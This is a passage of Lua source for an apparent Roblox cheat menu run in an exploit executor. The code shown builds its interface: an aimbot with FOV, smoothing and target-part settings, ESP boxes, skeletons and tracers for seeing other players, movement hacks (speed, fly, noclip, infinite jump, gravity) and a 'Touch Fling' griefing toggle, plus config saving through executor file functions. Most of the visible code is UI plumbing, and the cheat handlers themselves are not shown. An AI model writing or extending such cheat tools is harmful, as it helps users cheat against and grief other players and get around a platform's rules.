        local ay=y if yFlip then ay=gui.AbsoluteSize.Y-ay end
        return ax-cp.X,ay-cp.Y
    end
    local function releaseLocal(x,y)
        local lx,ly=localMouse(x,y)
        if lx>=-60 and lx<=W+60 and ly>=-60 and ly<=H+60 then return lx,ly end
        local vx,vy=gui.AbsoluteSize.X,gui.AbsoluteSize.Y
        local cp=cv.AbsolutePosition
        local best=1e9 local bx,by=lx,ly
        for _,f in ipairs({{0,0},{0,1},{1,0},{1,1}}) do
            local ax=(f[1]==1 and vx-x or x)-cp.X
            local ay=(f[2]==1 and vy-y or y)-cp.Y
            if ax>=-60 and ax<=W+60 and ay>=-60 and ay<=H+60 then
                local d=(ax-W/2)^2+(ay-H/2)^2
                if d<best then best=d bx,by=ax,ay end
            end
        end
        return bx,by
    end
    local function calibrate(x,y)
        local vx,vy=gui.AbsoluteSize.X,gui.AbsoluteSize.Y
        local cp=cv.AbsolutePosition
        local r
        if dragEl==1 then local o=nameL.Position.X.Offset r={o,nameL.Position.Y.Offset,140,16}
        elseif dragEl==2 then local o=distL.Position.X.Offset r={o,distL.Position.Y.Offset,80,16}
        else
            local p=state.tracerPos or 2
            if p==1 then r={ox-16,0,32,boxTop-2}
            elseif p==2 then r={ox-16,boxBot+4,32,(H-70)-(boxBot+4)}
            elseif p==3 then r={0,centerY-16,boxLeft-4,32}
            else r={boxRight+4,centerY-16,W-(boxRight+4),32} end
        end
        local cx,cy=r[1]+r[3]/2,r[2]+r[4]/2
        local best=1e9
        for _,f in ipairs({{0,0},{0,1},{1,0},{1,1}}) do
            local lx=(f[1]==1 and vx-x or x)-cp.X
            local ly=(f[2]==1 and vy-y or y)-cp.Y
            local d=(lx-cx)^2+(ly-cy)^2
            if d<best then best=d xFlip=f[1]==1 yFlip=f[2]==1 end
        end
    end
    local function beginDrag(el,i)
        dragEl=el dragMode=true
        calibrate(i.Position.X,i.Position.Y)
        placeDots()
        markActive(el)
    end
    local function updateVis()
        placeDots()
        nameL.Visible=true
        distL.Visible=true
        tracer.Visible=true
        thit.Visible=true
        if dragMode and dragEl then return end
        placeEl(1) placeEl(2) placeEl(3)
        tracer.BackgroundTransparency=0
        tracer.BackgroundColor3=TCol
    end
    local function upd()
        espBox.Visible=BoxE local bw,bh=baseBW*(BBW/4),baseBH*(BBH/6.5) espBox.Size=UDim2.fromOffset(bw,bh) espBox.Position=UDim2.fromOffset(ox-bw/2,centerY-bh/2) espStroke.Thickness=BoxThick espStroke.Color=BCol espBox.BackgroundTransparency=FillE and(1-FillOpacity/100) or 1
        if CornE then espStroke.Transparency=1 else espStroke.Transparency=0 end
        for _,c in ipairs(cFrames) do c.f.Visible=CornE c.f.BackgroundColor3=BCol if c.h then c.f.Size=UDim2.new(0.3,0,0,math.max(1,BoxThick)) else c.f.Size=UDim2.new(0,math.max(1,BoxThick),0.12,0) end end
        for _,l in ipairs(skelLines) do l.f.Visible=SkelE l.f.BackgroundColor3=SCol l.f.Size=UDim2.fromOffset(l.len,math.max(1,SKT)) end
        nameL.Text=DisplayTagsE and "DisplayName" or "PlayerName" nameL.Font=TxtFont
        distL.Font=TxtFont
        updateVis()
        if dragMode then markActive(dragEl) end
    end
    local function elPosName(el) return (el==1 and "namePos") or (el==2 and "distPos") or "tracerPos" end
    nameL.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then beginDrag(1,i) end end)
    distL.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then beginDrag(2,i) end end)
    thit.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then beginDrag(3,i) end end)
    UIS.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 and dragMode and previewActive then
        local lx,ly=releaseLocal(i.Position.X,i.Position.Y)
        local best,bd=1,1e9
        for k,pt in pairs(cornerPts()) do local d=(lx-pt[1])^2+(ly-pt[2])^2 if d<bd then bd=d best=k end end
        state[elPosName(dragEl)]=best
        dragMode=false dragEl=nil placeDots() updateVis()
    end end)
    updateVis()
    local conn=RunService.Heartbeat:Connect(function() if not previewGui or not gui.Parent then if conn then conn:Disconnect() end return end if previewActive then upd() end end)
    if buildOnly then previewGui.Enabled=false previewActive=false else previewOpenAnim() end
end
-- Slider styling: compact background panel with the drag rail below it.
local function Value(parent,text,min,max,default,dec,suffix,fn,col)
	local wrap=nn("Frame",{Size=UDim2.new(1,0,0,48),BackgroundTransparency=1,Parent=parent})
	local panel=nn("Frame",{Size=UDim2.new(1,0,0,28),BackgroundColor3=T.SliderBg,BorderSizePixel=0,Parent=wrap}) corner(panel,2)
	nn("TextLabel",{Text=text,Font=Fn,TextSize=13,TextColor3=T.Text,TextXAlignment=Enum.TextXAlignment.Left,BackgroundTransparency=1,Position=UDim2.new(0,12,0,0),Size=UDim2.new(.45,0,1,0),Parent=panel})
	local number=nn("TextLabel",{Text=string.format("%."..dec.."f",default)..(suffix or ""),Font=Fn,TextSize=13,TextColor3=T.ValTxt,TextXAlignment=Enum.TextXAlignment.Right,BackgroundTransparency=1,Position=UDim2.new(1,-6,0,0),AnchorPoint=Vector2.new(1,0),Size=UDim2.new(0,26,1,0),Parent=panel})
	local minus=nn("TextButton",{Text="-",Font=FB,TextSize=16,TextColor3=T.Text,BackgroundTransparency=1,AutoButtonColor=false,BorderSizePixel=0,Position=UDim2.new(1,-78,0.5,0),AnchorPoint=Vector2.new(1,0.5),Size=UDim2.new(0,22,0,22),Parent=panel})
	local plus=nn("TextButton",{Text="+",Font=FB,TextSize=16,TextColor3=T.Text,BackgroundTransparency=1,AutoButtonColor=false,BorderSizePixel=0,Position=UDim2.new(1,-56,0.5,0),AnchorPoint=Vector2.new(1,0.5),Size=UDim2.new(0,22,0,22),Parent=panel})
	minus.MouseEnter:Connect(function() tw(minus,0.1,{TextColor3=T.Accent}) end) minus.MouseLeave:Connect(function() tw(minus,0.1,{TextColor3=T.Text}) end)
	plus.MouseEnter:Connect(function() tw(plus,0.1,{TextColor3=T.Accent}) end) plus.MouseLeave:Connect(function() tw(plus,0.1,{TextColor3=T.Text}) end)
	local rail=nn("Frame",{Size=UDim2.new(1,0,0,2),Position=UDim2.new(0,0,0,28),BackgroundColor3=T.Track,BorderSizePixel=0,Parent=wrap})
	local fill=nn("Frame",{Size=UDim2.new(math.clamp((default-min)/(max-min),0,1),0,1,0),BackgroundColor3=col or T.Accent,BorderSizePixel=0,Parent=rail}) local dot=nn("Frame",{Size=UDim2.new(0,8,0,8),Position=UDim2.new(1,0,0.5,0),AnchorPoint=Vector2.new(1,0.5),BackgroundColor3=col or T.Accent,BorderSizePixel=0,ZIndex=2,Parent=fill}) corner(dot,4) local dst=nn("UIStroke",{Color=col or T.Accent,Thickness=2,Parent=dot}) if not col then table.insert(state.accents,{dst,"Color"}) table.insert(state.live,function() fill.BackgroundColor3=T.Accent dot.BackgroundColor3=T.Accent end) end
	local hit=nn("TextButton",{Size=UDim2.new(1,0,0,18),Position=UDim2.new(0,0,0,30),BackgroundTransparency=1,Text="",Parent=wrap}) local dragging=false
	local val=default
	local unit=(dec==0) and 1 or (0.1^dec)
	local function clampVal(v) if v<min then return min elseif v>max then return max end if dec==0 then return math.floor(v+0.5) else local pow=10^dec return math.floor(v*pow+0.5)/pow end end
	local function refresh()
		fill.Size=UDim2.new(math.clamp((val-min)/(max-min),0,1),0,1,0)
		number.Text=string.format("%." ..dec.."f",val)..(suffix or "")
		if fn then fn(val) end
	end
	local function setFromX(x) local a=math.clamp((x-rail.AbsolutePosition.X)/rail.AbsoluteSize.X,0,1) val=clampVal(min+(max-min)*a) number.Text=string.format("%."..dec.."f",val)..(suffix or "") fill.Size=UDim2.new(a,0,1,0) if fn then fn(val) end end
	local held=nil
	local function bump(q) val=clampVal(val+q) number.Text=string.format("%."..dec.."f",val)..(suffix or "") fill.Size=UDim2.new(math.clamp((val-min)/(max-min),0,1),0,1,0) if fn then fn(val) end end
	local function pump()
		local n=0 local t=0.32
		while held do task.wait(t) if not held then break end t=math.max(0.06,t-0.04*(0.97^math.min(n,16))) n=n+1 bump(held*unit*(1+math.floor((n-1)/8))) end
	end
	hit.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dragging=true setFromX(i.Position.X) end end)
	UIS.InputChanged:Connect(function(i) if dragging and i.UserInputType==Enum.UserInputType.MouseMovement then setFromX(i.Position.X) end end)
	UIS.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dragging=false held=nil end end)
	minus.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then bump(-unit) if not held then held=-1 task.spawn(pump) end end end)
	plus.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then bump(unit) if not held then held=1 task.spawn(pump) end end end)
	local k,b=rowKey(wrap,text) table.insert(state.values,{name=k,bare=b,get=function() return val end,set=function(v) val=clampVal(v or default) number.Text=string.format("%."..dec.."f",val)..(suffix or "") fill.Size=UDim2.new(math.clamp((val-min)/(max-min),0,1),0,1,0) if fn then fn(val) end end,def=default})
	task.defer(function() if fn then fn(val) end end)
	return {Get=function() return val end}
end
local function Dropdown(parent,text,source,default,fn,keepOpen,order,pill)
	local wrap=nn("Frame",{Size=UDim2.new(1,0,0,46),BackgroundTransparency=1,ClipsDescendants=true,Parent=parent})
	if order then wrap.LayoutOrder=order end
	local current=default or "None"
	local value
	local arrow
	if pill then
		local pbutton=nn("TextButton",{Size=UDim2.new(1,0,0,26),BackgroundColor3=T.SliderBg,BorderSizePixel=0,Text="",AutoButtonColor=false,ZIndex=3,Parent=wrap}) nn("UICorner",{CornerRadius=UDim.new(0,4),Parent=pbutton})
		nn("TextLabel",{Text=text,Font=Fn,TextSize=13,TextColor3=T.Text,TextXAlignment=Enum.TextXAlignment.Left,BackgroundTransparency=1,ZIndex=4,Position=UDim2.new(0,10,0,0),Size=UDim2.new(0.6,0,1,0),Parent=pbutton})
		value=nn("TextLabel",{Text=current,Font=Fn,TextSize=13,TextColor3=T.ValTxt,TextXAlignment=Enum.TextXAlignment.Right,BackgroundTransparency=1,ZIndex=4,Position=UDim2.new(0.6,0,0,0),AnchorPoint=Vector2.new(1,0),Size=UDim2.new(0.4,-10,1,0),Parent=pbutton})
	else
		nn("TextLabel",{Text=text,Font=Fn,TextSize=13,TextColor3=T.Text,TextXAlignment=Enum.TextXAlignment.Left,BackgroundTransparency=1,Position=UDim2.new(0,0,0,0),Size=UDim2.new(0.55,0,0,30),Parent=wrap})
		value=nn("TextLabel",{Text=current,Font=Fn,TextSize=13,TextColor3=T.ValTxt,TextXAlignment=Enum.TextXAlignment.Right,BackgroundTransparency=1,Position=UDim2.new(0.45,-16,0,0),Size=UDim2.new(0.55,0,0,30),Parent=wrap})
		arrow=nn("TextLabel",{Text="^",Font=FB,TextSize=13,TextColor3=T.Muted,BackgroundTransparency=1,Position=UDim2.new(1,-7,0,15),AnchorPoint=Vector2.new(0.5,0.5),Size=UDim2.new(0,12,0,12),Parent=wrap})
		local line=nn("Frame",{Size=UDim2.new(1,0,0,2),Position=UDim2.new(0,0,0,30),BackgroundColor3=T.Accent,BorderSizePixel=0,Parent=wrap}) table.insert(state.live,function() line.BackgroundColor3=T.Accent end)
	end
	local options=nn("Frame",{Position=UDim2.new(0,0,0,32),Size=UDim2.new(1,0,0,0),BackgroundColor3=T.SliderBg,BorderSizePixel=0,ClipsDescendants=true,Parent=wrap}) corner(options,6) local layout=list(options,2) layout.HorizontalAlignment=Enum.HorizontalAlignment.Center nn("UIPadding",{PaddingTop=UDim.new(0,3),Parent=options})
	local hit=nn("TextButton",{Size=UDim2.new(1,0,0,26),BackgroundTransparency=1,Text="",AutoButtonColor=false,ZIndex=5,Parent=wrap})
	local open=false
	local function setHeight(h) tw(options,0.2,{Size=UDim2.new(1,0,0,h)}) tw(wrap,0.2,{Size=UDim2.new(1,0,0,46+h)}) end
	local function close() open=false setHeight(0) end
	local function build()
		for _,child in pairs(options:GetChildren()) do if child:IsA("TextButton") then child:Destroy() end end
		local items=(type(source)=="function") and source() or source
		if not items or #items==0 then items={"(none)"} end
		for _,item in ipairs(items) do
			local plr=Players:FindFirstChild(item)
			local isFr=state.friends[item] or (plr and (state.friends[plr.Name] or state.friends[plr.DisplayName] or state.friends[tostring(plr.UserId)]))
			local button=nn("TextButton",{Size=UDim2.new(1,-6,0,24),BackgroundColor3=T.Accent,BackgroundTransparency=(item==current) and 0.8 or 1,AutoButtonColor=false,Text=item,Font=Fn,TextSize=12,TextColor3=isFr and T.Accent or T.Text,Parent=options}) corner(button,5) table.insert(state.live,function() button.BackgroundColor3=T.Accent end)
			button.MouseEnter:Connect(function() tw(button,0.1,{BackgroundTransparency=0.7}) end)
			button.MouseLeave:Connect(function() tw(button,0.1,{BackgroundTransparency=(button.Text==current) and 0.8 or 1}) end)
			button.MouseButton1Click:Connect(function()
				if item=="(none)" then return end
				current=item value.Text=item
				if fn then fn(item) end
				if keepOpen then build() else close() end
			end)
		end
		value.Text=(current=="0") and tostring(#items) or current
		return #items
	end
	hit.MouseButton1Click:Connect(function()
		open=not open
		if not keepOpen and arrow then tw(arrow,0.15,{Rotation=open and 180 or 0}) end
		if open then setHeight(build()*26+6) else close() end
	end)
	if keepOpen then
		local function refreshList() if wrap.Parent then local count=build() options.Size=UDim2.new(1,0,0,count*26+6) wrap.Size=UDim2.new(1,0,0,52+count*26) end end
		task.defer(refreshList)
		Players.PlayerAdded:Connect(function() task.defer(refreshList) task.delay(1.1,refreshList) end)
		Players.PlayerRemoving:Connect(function() task.defer(refreshList) end)
	end
	local k,b=rowKey(wrap,text) table.insert(state.ddrops,{name=k,bare=b,get=function() return current end,set=function(v) if v and v~="" then current=v value.Text=v if fn then fn(v) end end end,def=current})
	return {Get=function() return current end}
end
-- BUILD TABS
local function buildTabs()
Combat  = CreateTab("Combat",  "118778973706159", 1, 59.6, 0.5)
Player  = CreateTab("Player",  "74264856765619", 2, 47.8, 1)
Visuals = CreateTab("Visuals", "75655481224601",  3, 24.4)
Online  = CreateTab("Online",  "106802964895674", 4, 22.3)
Configs = CreateTab("Configs","134850643352164", 5, 23)
Misc    = CreateTab("Misc",    "90294482262236",  6, 22.05, 1)
local avBox=nn("Frame",{Size=UDim2.new(0,44,0,44),Position=UDim2.new(0.5,0,1,-42),AnchorPoint=Vector2.new(0.5,0.5),BackgroundColor3=Color3.new(T.Accent.R*0.4,T.Accent.G*0.4,T.Accent.B*0.4),BackgroundTransparency=0.65,BorderSizePixel=0,ZIndex=3,Parent=Rail}) corner(avBox,6) table.insert(state.accents,{stroke(avBox,T.Accent),"Color"}) table.insert(state.live,function() avBox.BackgroundColor3=Color3.new(T.Accent.R*0.4,T.Accent.G*0.4,T.Accent.B*0.4) end) local avImg=nn("ImageLabel",{Size=UDim2.new(0,40,0,40),Position=UDim2.new(0.5,-20,0.5,-20),BackgroundTransparency=1,Image="https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username="..player.Name,ScaleType=Enum.ScaleType.Crop,ZIndex=4,Parent=avBox}) corner(avImg,4) local avTxt=nn("TextLabel",{Text=player.DisplayName,Font=Fn,TextSize=12,TextColor3=T.Accent,TextTruncate=Enum.TextTruncate.AtEnd,TextXAlignment=Enum.TextXAlignment.Center,BackgroundTransparency=1,Position=UDim2.new(0.5,0,1,-9),AnchorPoint=Vector2.new(0.5,0.5),Size=UDim2.new(0,80,0,14),ZIndex=4,Parent=Rail}) table.insert(state.live,function() local ln=#player.DisplayName avTxt.Text=player.DisplayName avTxt.TextSize=ln<=4 and 14 or ln<=7 and 13 or ln<=10 and 12 or ln<=13 and 11 or 10 avTxt.TextColor3=T.Accent end) task.spawn(function() pcall(function() local ok,u=pcall(Players.GetUserThumbnailAsync,Players,player.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size100x100) if ok and u and #u>0 then avImg.Image=u end end) end)
local function buildConfigs()
local cF=Configs.Left("Create Config")
local cfgBox=nn("TextBox",{Size=UDim2.new(1,0,0,26),BackgroundColor3=T.SliderBg,BorderSizePixel=0,Text="",PlaceholderText="config name",Font=Fn,TextSize=12,TextColor3=T.Text,TextXAlignment=Enum.TextXAlignment.Center,Parent=cF})
local cfgName="" local selCfg="" local selRow=nil local cfgCache="" local refreshCfg
cfgBox.FocusLost:Connect(function() cfgName=string.gsub(cfgBox.Text,"[^%w]","") cfgBox.Text="" end)
Button(cF,"Save Config",function() if #cfgName>0 then saveConfig(cfgName) refreshCfg() end end)
Button(cF,"Load Config",function() pcall(function() if #selCfg>0 and loadConfig(selCfg) and selRow then local f=selRow.rw if f then f.BackgroundColor3=Color3.new(T.Accent.R*0.55,T.Accent.G*0.55,T.Accent.B*0.55) task.delay(0.6,function() if f.Parent then pcall(selPaint) end end) end end end) end)
Button(cF,"Delete Config",function() if #selCfg>0 then pcall(delfile,"uniq_config_"..selCfg..".json") local ok,raw=pcall(readfile,"uniq_configs_index.json") if ok and raw and #raw>0 then local ok2,d=pcall(game:GetService("HttpService").JSONDecode,game:GetService("HttpService"),raw) if ok2 and type(d)=="table" then local nl={} for _,n in ipairs(d) do if n~=selCfg then table.insert(nl,n) end end pcall(writefile,"uniq_configs_index.json",game:GetService("HttpService"):JSONEncode(nl)) end end end refreshCfg() end)
local selTxt=nn("TextLabel",{Text="No config selected",Size=UDim2.new(1,0,0,14),BackgroundTransparency=1,Font=Fn,TextSize=10,TextColor3=T.Muted,TextXAlignment=Enum.TextXAlignment.Center,Parent=cF})
local cR=Configs.Right("Saved Configs")
local cfgList=nn("Frame",{Size=UDim2.new(1,0,0,0),BackgroundTransparency=1,AutomaticSize=Enum.AutomaticSize.Y,Parent=cR}) list(cfgList,6)
local cfgEmp=nn("TextLabel",{Text="Saved configs will appear here",Size=UDim2.new(1,0,0,16),BackgroundTransparency=1,Font=Fn,TextSize=10,TextColor3=T.ValTxt,TextXAlignment=Enum.TextXAlignment.Center,Parent=cR})
local function selPaint() for _,o in ipairs(cfgList:GetChildren()) do if o:IsA("Frame") then o.BackgroundColor3=T.SliderBg local s=o:FindFirstChildOfClass("UIStroke") if s then s.Color=T.Stroke end end end if selRow then selRow.rw.BackgroundColor3=Color3.new(T.Accent.R*0.3,T.Accent.G*0.3,T.Accent.B*0.3) selRow.stk.Color=T.Accent end end
refreshCfg=function()
	local names=listConfigs() local sig=table.concat(names,"|") if sig==cfgCache then return end cfgCache=sig
	selCfg="" selRow=nil selTxt.Text="No config selected" selTxt.TextColor3=T.Muted
	for _,ch in ipairs(cfgList:GetChildren()) do if ch:IsA("TextButton") or ch:IsA("Frame") then ch:Destroy() end end
	local n=0
	for _,nm in ipairs(names) do
		n=n+1
		local rw=nn("Frame",{Size=UDim2.new(1,0,0,28),BackgroundColor3=T.SliderBg,BorderSizePixel=0,Parent=cfgList}) corner(rw,4) local stk=stroke(rw,T.Stroke)
		nn("TextLabel",{Size=UDim2.new(1,-30,0,28),Position=UDim2.new(0,8,0,0),Text=nm,Font=Fn,TextSize=12,TextColor3=T.Text,TextXAlignment=Enum.TextXAlignment.Left,BackgroundTransparency=1,Parent=rw})
		local fb=nn("TextButton",{Size=UDim2.new(1,0,0,28),Text="",BackgroundTransparency=1,Parent=rw})
		fb.MouseButton1Click:Connect(function() selCfg=nm selRow={rw=rw,stk=stk} selPaint() selTxt.Text="Selected: "..nm selTxt.TextColor3=T.Accent end)
	end
	cfgEmp.Visible=n==0
end
Tabs.hook=function() refreshCfg() end
refreshCfg()
task.spawn(function() while true do task.wait(5) if Tabs.active=="Configs" then refreshCfg() end end end)
end
buildConfigs()
local cL=Combat.Left("Aimbot")
Condition(cL,"Enabled",false,function(v) TH["Aimbot"](v) end)
KeybindRow(cL,"Aim Key",nil,function(k) state.aimbotKey=k end)
Dropdown(cL,"Activation Mode",{"Hold","Toggle"},"Hold",function(v) DH["Activation Mode"](v) end)
Condition(cL,"Show FOV",false,function(v) TH["Show FOV"](v) end)
Condition(cL,"Visible Only",false,function(v) TH["Visible Only"](v) end)
local cL2=Combat.Left("Range")
Value(cL2,"FOV Size",1,360,120,0,"",function(v) SH["FOV Size"](v) end)
Value(cL2,"Min Distance",1,100,1,0,"",function(v) SH["Aim Min Distance"](v) end)
Value(cL2,"Max Distance",1,500,500,0,"",function(v) SH["Aim Max Distance"](v) end)
Condition(cL2,"Target Dead",false,function(v) TH["Aim Ignore Dead"](v) end)
Condition(cL2,"Ignore Friend",false,function(v) state.aimIgnoreFriend=v end)
local cR=Combat.Right("Targeting")
Dropdown(cR,"Aim Method",{"Camera","MouseMoveRel"},"MouseMoveRel",function(v) state.aimMethod=v end)
Dropdown(cR,"Target Part",{"Head","Neck","Torso","Closest"},"Head",function(v) DH["Target Part"](v) end)
cR=Combat.Right("Smoothing")
Value(cR,"Horizontal Smoothing",0,100,10,0,"",function(v) SH["Horizontal Smoothing"](v) end)
Value(cR,"Vertical Smoothing",0,100,10,0,"",function(v) SH["Vertical Smoothing"](v) end)
cR=Combat.Right("Prediction")
Condition(cR,"Prediction",false,function(v) state.predictEnabled=v end)
Value(cR,"Prediction Sensitivity",0,100,100,0,"",function(v) state.predictSens=math.clamp(v,0,100)/100 end)
end
buildTabs()
local function buildPlayer()
local pL=Player.Left("Movement")
Condition(pL,"Speed",false,function(v) TH["Toggle"](v,"Speed") end) Condition(pL,"Fly",false,function(v) TH["Toggle"](v,"Fly") end) Condition(pL,"Super Jump",false,function(v) TH["Toggle"](v,"Super Jump") end) Condition(pL,"Gravity Changer",false,function(v) TH["Gravity Changer"](v) end) Condition(pL,"NoClip",false,function(v) TH["NoClip"](v) end) Condition(pL,"Infinite Jump",false,function(v) TH["Infinite Jump"](v) end) Condition(pL,"Auto Jump",false,function(v) TH["Auto Jump"](v) end) Condition(pL,"No Jump Cooldown",false,function(v) TH["No Jump Cooldown"](v) end) Condition(pL,"No Ragdoll",false,function(v) TH["No Ragdoll"](v) end) Condition(pL,"Touch Fling",false,function(v) setTouchFling(v) end)
-- Fly Speed max value increased to 1000
local pR=Player.Right("Customization") Value(pR,"Walk Speed",16,1000,200,0,"",function(v) SH["Walk Speed"](v) end) Value(pR,"Fly Speed",50,1000,300,0,"",function(v) SH["Fly Speed"](v) end) Value(pR,"Jump Height",7.2,100,20,1,"",function(v) SH["Jump Height"](v) end) Value(pR,"Gravity",1,1000,196.2,0,"",function(v) SH["Gravity"](v) end)
	end buildPlayer()
local function buildVisuals()
local vL=Visuals.Left("ESP Options") Condition(vL,"Enabled",false,function(v) TH["Enabled"](v) end)
local fillCond,cornerCond
local boxesCond=Condition(vL,"Boxes",false,function(v) TH["Boxes"](v) for _,c in ipairs({fillCond,cornerCond}) do if c then c.Row.Visible=v if v then c.Row.Size=UDim2.new(1,0,0,0) tw(c.Row,0.25,{Size=UDim2.new(1,0,0,28)}) end end end end)
fillCond=Condition(vL,"Filled Boxes",false,function(v) TH["Filled Boxes"](v) end,16) cornerCond=Condition(vL,"Corner Boxes",false,function(v) TH["Corner Boxes"](v) end,16) fillCond.Row.Visible=false cornerCond.Row.Visible=false
Condition(vL,"Skeleton",false,function(v) TH["Skeleton"](v) end) Condition(vL,"Tracers",false,function(v) TH["Tracers"](v) end) Condition(vL,"Distance",false,function(v) TH["Distance"](v) end)
local nameCond,displayCond
nameCond=Condition(vL,"Name Tags",false,function(v) if v and displayCond then displayCond.Set(false) end TH["Nametags"](v) end)
displayCond=Condition(vL,"Display Tags",false,function(v) if v and nameCond then nameCond.Set(false) end TH["Display Tags"](v) end)
local vF=Visuals.Left("Filters") Condition(vF,"Ignore Dead",false,function(v) TH["Ignore Dead"](v) end) Condition(vF,"Ignore Self",false,function(v) TH["Ignore Self"](v) end)
Condition(vF,"Ignore Friend",false,function(v) TH["Ignore Friend"](v) end)
local vR=Visuals.Right("Customization")
Value(vR,"Max Distance",50,2000,500,0,"m",function(v) SH["Max Distance"](v) end)
Value(vR,"Fill Opacity",0,100,40,0,"%",function(v) SH["Fill Opacity"](v) end)
Value(vR,"Box Thickness",1,5,1.5,1,"",function(v) SH["Box Thickness"](v) end)
Value(vR,"Horizontal Box Size",2,6,4,1,"",function(v) SH["Horizontal Box Size"](v) end)
Value(vR,"Vertical Box Size",3,10,6.5,1,"",function(v) SH["Vertical Box Size"](v) end)
Value(vR,"Tracer Thickness",1,5,1,1,"",function(v) SH["Tracer Thickness"](v) end)
	Value(vR,"Skeleton Thickness",1,5,1,1,"",function(v) SH["Skeleton Thickness"](v) end)
Dropdown(vR,"Text Style",function() return DS["Text Style"]() end,"GothamBold",function(v) DH["Text Style"](v) end)
state.previewBtn=Button(vR,"Toggle Preview",TogglePreview) state.previewBtn.Text="ESP Builder: On" TogglePreview(true)
end buildVisuals()
local function buildOnline()
local oL=Online.Left("Player List")
local oS=Online.Left("Staff List")
local function buildPlayerList()
	local plSearch, cb1, cb2, plHost
	local liveRows={}
	local plSort="By Name"
	local function plDist(p)
		local cp=Camera.CFrame.Position
		local their=p.Character and p.Character:FindFirstChild("HumanoidRootPart")
		if their then return (cp-their.Position).Magnitude*0.28 end
		return nil
	end
	local function paintButtons()
		cb1.BackgroundColor3=plSort=="Closest" and T.Accent or T.SliderBg
		cb1.TextColor3=plSort=="Closest" and Color3.new(1,1,1) or T.Text
		cb2.BackgroundColor3=plSort=="By Name" and T.Accent or T.SliderBg
		cb2.TextColor3=plSort=="By Name" and Color3.new(1,1,1) or T.Text
		if not state.liveP then state.liveP=true table.insert(state.live,function() cb1.BackgroundColor3=plSort=="Closest" and T.Accent or T.SliderBg end) table.insert(state.live,function() cb2.BackgroundColor3=plSort=="By Name" and T.Accent or T.SliderBg end) end
	end
	local function buildPlayerRows()
		if not plHost or not plHost.Parent then return end
		for _,c in ipairs(plHost:GetChildren()) do if c.Name=="PLR" or c.Name=="EMPTY" then c:Destroy() end end
		liveRows={}
		local q=string.lower(plSearch.Text or "")
		local list={}
		for _,p in ipairs(Players:GetPlayers()) do
			if p~=player then
				local n=(state.playerListTagStyle=="Display Tags" and p.DisplayName or p.Name)
				if q=="" or string.find(string.lower(n),q,1,true) then table.insert(list,{n=n,p=p}) end
			end
		end
		local function low(n) return string.lower(n) end
		local function sortKey(n)
			local s=low(n)
			local c=s:sub(1,1)
			if c>="a" and c<="z" then return "1"..s else return "0"..s end
		end
		if plSort=="Closest" then
			table.sort(list,function(a,b) local da=plDist(a.p) or 1e9 local db=plDist(b.p) or 1e9 if da==db then return sortKey(a.n)<sortKey(b.n) end return da<db end)
		else
			table.sort(list,function(a,b) return sortKey(a.n)<sortKey(b.n) end)
		end
		if #list==0 then
			nn("TextLabel",{Name="EMPTY",Text="No Players found",Font=Fn,TextSize=13,TextColor3=T.Muted,BackgroundTransparency=1,TextXAlignment=Enum.TextXAlignment.Left,Size=UDim2.new(1,0,0,24),Parent=plHost})
		end
		for _,e in ipairs(list) do
			local sel=state.selectedPlayer==e.n
			local isFr=state.friends[e.n] or (e.p and (state.friends[e.p.DisplayName] or state.friends[tostring(e.p.UserId)]))
			local row=nn("Frame",{Name="PLR",LayoutOrder=1,Size=UDim2.new(1,0,0,24),BackgroundTransparency=1,Parent=plHost})
			local hl=nn("Frame",{Size=UDim2.new(1,-6,0,20),Position=UDim2.new(0,3,0,2),BackgroundColor3=Color3.fromRGB(80,80,88),BackgroundTransparency=sel and 0 or 1,BorderSizePixel=0,Parent=row}) corner(hl,4)
			local lbl=nn("TextLabel",{Text=e.n,Font=Fn,TextSize=13,TextColor3=isFr and T.Accent or T.Text,BackgroundTransparency=1,TextXAlignment=Enum.TextXAlignment.Left,Position=UDim2.new(0,4,0,0),Size=UDim2.new(1,-76,0,24),ZIndex=2,Parent=row}) table.insert(state.live,function() lbl.TextColor3=isFr and T.Accent or T.Text end)
			local distLbl
			if plSort=="Closest" then
				local d=plDist(e.p)
				distLbl=nn("TextLabel",{Text=d and math.floor(d).."m" or "Unknown",Font=Fn,TextSize=11,TextColor3=d and T.ValTxt or T.Muted,BackgroundTransparency=1,TextXAlignment=Enum.TextXAlignment.Right,AnchorPoint=Vector2.new(1,0),Position=UDim2.new(1,0,0,0),Size=UDim2.new(0,64,0,24),ZIndex=2,Parent=row})
				table.insert(liveRows,{p=e.p,lbl=distLbl})
			end
			local hit=nn("TextButton",{Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,Text="",AutoButtonColor=false,Parent=row})
			hit.MouseEnter:Connect(function() tw(hl,0.1,{BackgroundTransparency=sel and 0 or 0.6}) end)
			hit.MouseLeave:Connect(function() tw(hl,0.1,{BackgroundTransparency=sel and 0 or 1}) end)
			hit.MouseButton1Click:Connect(function()
				DH["Select Player"](e.n)
				if state.friendBtn then
					state.friendBtn.Text=state.friends[e.n] and "Remove Friend" or "Add Friend"
					state.friendBtn.TextColor3=state.friends[e.n] and T.Accent or T.Text
				end
				if state.isSpectating then
					task.spawn(function()
						local target=findP(e.n)
						if not target then return end
						local tries=0
						while tries<20 do
							local h=target.Character and target.Character:FindFirstChildOfClass("Humanoid")
							if h and h.Health>=0 then workspace.CurrentCamera.CameraSubject=h return end
							tries+=1 task.wait(0.1)
						end
					end)
				end
				buildPlayerRows()
			end)
		end
	end
	plSearch=nn("TextBox",{Name="oSearch",LayoutOrder=0,Size=UDim2.new(1,-2,0,26),BackgroundTransparency=0,BackgroundColor3=T.SliderBg,BorderSizePixel=0,Text="",PlaceholderText="Search Player",PlaceholderColor3=T.Muted,Font=Fn,TextSize=13,TextColor3=T.Text,ClearTextOnFocus=false,TextXAlignment=Enum.TextXAlignment.Left,ZIndex=2,Parent=oL})
